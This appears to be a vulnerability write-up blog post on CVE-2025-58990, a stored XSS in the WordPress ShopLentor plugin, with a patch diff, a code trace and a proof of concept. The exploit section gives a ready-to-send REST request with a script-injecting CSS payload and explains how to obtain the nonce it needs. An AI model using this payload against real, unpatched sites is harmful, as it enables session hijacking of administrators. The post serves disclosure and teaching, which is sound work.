---
title: CVE-2025-58990 Analysis & POC
description: Security Vulnerability in WordPress ShopLentor Plugin.
date: 2025-09-17 22:45:00 +0700
categories: [Vulnerabilities, CVE Analyst]
tags: [analyst, plugin, xss]
---

A vulnerability in the **ShopLentor** plugin before version **3.2.0** allows attackers with **contributor** privileges to inject malicious code into block CSS. This CSS is then loaded inline on the page and can lead to Stored XSS when previewed or rendered in the browser.

* **CVE ID**: [CVE-2025-58990](https://www.cve.org/CVERecord?id=CVE-2025-58990)
* **Product**: [WordPress ShopLentor Plugin](https://wordpress.org/plugins/woolentor-addons/)
* **Vulnerability Type**: Cross Site Scripting
* **Affected Versions**: <= 3.2.0
* **CVSS Severity**: Low (6.5)
* **Required Privilege**: Contributor

---

## Requirements

* [**Local WordPress and Debugging**](https://w41bu1.github.io/posts/wordpress-local-and-debugging/)
* **ShopLentor**: v3.2.0 (vulnerable) and v3.2.1 (patched)
* **Diff tool**: **meld** or any tool to compare differences between versions
* **Activated WooCommerce plugin**: WooCommerce must be active before installing **ShopLentor Plugin**

---

## Analysis

### Patch Diff

Use any diff tool to compare the vulnerable version with the patched version.
The main difference is in **woolentor-blocks/includes/classes/Manage\_Styles.php**.

**Vulnerable version**:

```php
public function save_block_css( $request ){
    $params 	= $request->get_params();
    $post_id = sanitize_text_field( $params['post_id'] );

    // No user permission check
    // No sanitization of CSS before saving
    update_post_meta( $post_id, '_woolentor_css', $params['block_css'] );
    $wp_filesystem->put_contents( $dirname . $filename, $params['block_css'] );
}
```

**Patched version**:

```php
public function save_block_css( $request ){
    $params 	= $request->get_params();
    $post_id = sanitize_text_field( $params['post_id'] );

    // Only admin or post author allowed
    $post = get_post( $post_id );
    if ( ! $post || ( ! current_user_can('manage_options') &&
        get_current_user_id() !== (int) $post->post_author ) ) {
        return ['success' => false, 'message' => __('No permission')];
    }

    // Sanitize CSS before saving
    $block_css = $this->sanitize_css_content( $params['block_css'] );
    update_post_meta( $post_id, '_woolentor_css', $block_css );
    $wp_filesystem->put_contents( $dirname . $filename, $block_css );
}
```

The patch uses `current_user_can('manage_options')` to check if the user is an **admin**:

* If the user is **admin** => first condition is false => expression passes.
* If the user is **author** => second condition is false => expression passes.

![Patch Diff](images/posts/2025-09-17-CVE-2025-58990/patch_diff.png)

### How It Works

```php
public function save_block_css( $request ){
    try{
        global $wp_filesystem;
        if ( ! $wp_filesystem || !function_exists('WP_Filesystem') ) {
            require_once( ABSPATH . 'wp-admin/includes/file.php' );
        }

        $params 	= $request->get_params();
        $post_id 	= sanitize_text_field( $params['post_id'] );
        
        if ( $post_id == 'woolentor-widget' && $params['has_block'] ) {
            update_option( $post_id, $params['block_css'] );
            return [
                'success' => true, 
                'message' => __('Widget CSS Saved.', 'woolentor')
            ];
        }

        $filename 		= "woolentor-css-{$post_id}.css";
        $upload_dir_url = wp_upload_dir();
        $dirname 		= trailingslashit( $upload_dir_url['basedir'] ) . 'woolentor-addons/';

        if ( $params['has_block'] ) {
            update_post_meta( $post_id, '_woolentor_active', 'yes' );
            $all_block_css = $params['block_css'];

            WP_Filesystem( false, $upload_dir_url['basedir'], true );
            if( ! $wp_filesystem->is_dir( $dirname ) ) {
                $wp_filesystem->mkdir( $dirname );
            }

            update_post_meta( $post_id, '_woolentor_css', $all_block_css );
            if ( ! $wp_filesystem->put_contents( $dirname . $filename, $all_block_css ) ) {
                throw new \Exception( __('You are not permitted to save CSS.', 'woolentor' ) ); 
            }
            return [
                'success' => true,
                'message' =>__('WooLentor Blocks css file update.', 'woolentor' )
            ];
        } else {
            delete_post_meta( $post_id, '_woolentor_active' );
            if ( file_exists( $dirname.$filename ) ) {
                wp_delete_file( $dirname.$filename );
            }
            delete_post_meta( $post_id, '_woolentor_css' );
            return [
                'success' => true,
                'message' => __('WooLentor Blocks CSS Delete.', 'woolentor' )
            ];
        }
    } catch( \Exception $e ){
        return [
            'success' => false,
            'message' => $e->getMessage()
        ];
    }
}
```

The `save_block_css()` function in class `Manage_Styles` is responsible for saving or deleting CSS depending on the block.

The application receives `post_id` and `block_css` from the request.

**Special case**: if `post_id = woolentor-widget` => save CSS in `wp_options`.

**Normal post case**:

* If there is a block (`has_block = true`):

  * Mark the post as active (`_woolentor_active`).
  * Save CSS in the `wp_postmeta` table with `meta_key = _woolentor_css`.

  ```sql
  mysql> select * from wp_postmeta where meta_key='_woolentor_css';
  +---------+---------+----------------+------------+
  | meta_id | post_id | meta_key       | meta_value |
  +---------+---------+----------------+------------+
  |      27 |      69 | _woolentor_css | body:{}    |
  |     687 |    1416 | _woolentor_css | body:{}    |
  +---------+---------+----------------+------------+
  ```

  * Write CSS to a file in the uploads folder (`woolentor-css-{post_id}.css`).

  ![Write CSS](images/posts/2025-09-17-CVE-2025-58990/write_css.png)

* If there is no block (`has_block = false`):

  * Delete active status and CSS meta.
  * Delete CSS file if it exists.

ðŸ‘‰ This can lead to a common **Stored XSS** scenario in WordPress plugins: a **contributor** user (who cannot publish) creates a post with CSS containing an XSS payload. This payload is saved in the **database** or a **file**; a higher-privileged user previews the content, triggering execution of the payload in the browser.

To understand how the data is rendered, search for `_woolentor_css` in the plugin folder. Since CSS is saved in `wp_postmeta` with `meta_key = _woolentor_css`, the plugin queries it and injects it directly into HTML.

![Search Meta Key](images/posts/2025-09-17-CVE-2025-58990/meta_key.png)

`generate_inline_css()` retrieves block CSS from **wp\_postmeta** using `meta_key = _woolentor_css` and from the file `woolentor-css-{$post_id}.css`. If the file exists, it reads the content and inlines the CSS for the post with `$post_id`; otherwise, it takes the CSS from **wp\_postmeta**.

The content is wrapped in `<style type="text/css"></style>` tags.

Class `Manage_Styles` registers a **REST API** in `register_routes`:

```php
public function register_routes( $namespace ){
    register_rest_route( $namespace, 'save_css',
        [
            [
                'methods'  => 'POST', 
                'callback' => [ $this, 'save_block_css' ],
                'permission_callback' => [ $this, 'permission_check' ],
                'args' => []
            ]
        ]
    );
    // other route
}
```

`register_rest_route()` creates a **REST API** endpoint at:

```
/wp-json/{namespace}/save_css
```

When a **POST** request is sent to this endpoint:

* WordPress calls `save_block_css()` to handle the data.
* Before that, `permission_callback` runs `permission_check()` to verify the user (if false, request is blocked).

```php
public function permission_check() {
    if( current_user_can( 'edit_posts' ) ){
        return true;
    }else{
        return false;
    }
}
```

`permission_check` ensures that only users with **contributor** or higher can access the API.

The exact **namespace** is not defined in this class, but we can trace it using the `save_css` route. Access `/wp-json/` and search for `save_css`.

![Search](images/posts/2025-09-17-CVE-2025-58990/search.png)

The endpoint is:

```
http://localhost/wp-json/woolentor/v1/save_css
```

To locate where this **namespace** is defined, search the code for `'woolentor/v1'`. Focus on **Api.php** for the REST API.

`register_routes( $namespace )` in `Manage_Styles` requires `$namespace`, which is passed as `woolentor/v1`.

![Call Api](images/posts/2025-09-17-CVE-2025-58990/callapi.png)

ðŸ‘‰ Therefore, sending a **POST** request to `http://localhost/wp-json/woolentor/v1/save_css` triggers `save_block_css` to add/update block CSS in file and database.
When accessing a post with the corresponding `post_id`, `generate_inline_css` fetches the block CSS and inlines it in `<style type="text/css"></style>`.

---

## Exploit

### Detect XSS

Use a **contributor** user to create any post and note its `post_id`.

Send a **POST** request to `http://localhost/wp-json/woolentor/v1/save_css` with an XSS payload:

```http
POST /wp-json/woolentor/v1/save_css HTTP/1.1
Host: localhost
Content-Type: application/json

{
"post_id":1416,
"has_block":true,
"block_css":"</style><script>alert(document.domain)</script><style>"
}
```

**Response**

```json
{
    "code":"rest_forbidden",
    "message":"Sorry, you are not allowed to do that.",
    "data":{
        "status":401
    }
}
```

ðŸ‘‰ Missing **X-WP-Nonce** header for user authentication. Open the HTML source (<kbd>Ctrl</kbd>+<kbd>U</kbd>) of the post edit page:

```
view-source:http://localhost/wp-admin/post.php?post=<post_id>&action=edit
```

Search for `wpApiSettings` and get the `nonce` value.

![wpApiSettings](images/posts/2025-09-17-CVE-2025-58990/api_search.png)

Send the request with **X-WP-Nonce** set:

```http
POST /wp-json/woolentor/v1/save_css HTTP/1.1
Host: localhost
X-WP-Nonce: f79ec79e4b
Content-Type: application/json

{
"post_id":1416,
"has_block":true,
"block_css":"</style><script>alert(document.domain)</script><style>"
}
```

**Preview post**

![Preview](images/posts/2025-09-17-CVE-2025-58990/preview.png)

ðŸ‘‰ XSS succeeds. Inspect to see how the code is modified.

**View source code**

![Code](images/posts/2025-09-17-CVE-2025-58990/code.png)

## Conclusion

The **CVE-2025-58990** vulnerability in **ShopLentor <= 3.2.0** allows **contributors** to inject malicious CSS leading to Stored XSS when admins/authors preview or view posts. The **3.2.1** patch adds permission checks and CSS sanitization, preventing exploitation.

**Key takeaways**:

* Always combine **permission checks** and **data sanitization** when handling user input.
* Low-level roles (like **contributors**) can still be attack vectors if APIs are not properly secured.
* **Stored XSS** in WordPress typically occurs when data is saved in DB/file and rendered inline without sanitization.
* Keeping plugins updated is the simplest and most effective defense.

---

## References

[Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

[ WordPress ShopLentor Plugin <= 3.2.0 is vulnerable to Cross Site Scripting (XSS) ](https://patchstack.com/database/wordpress/plugin/ShopLentor/vulnerability/wordpress-ShopLentor-plugin-1-0-5-cross-site-scripting-xss-vulnerability)

---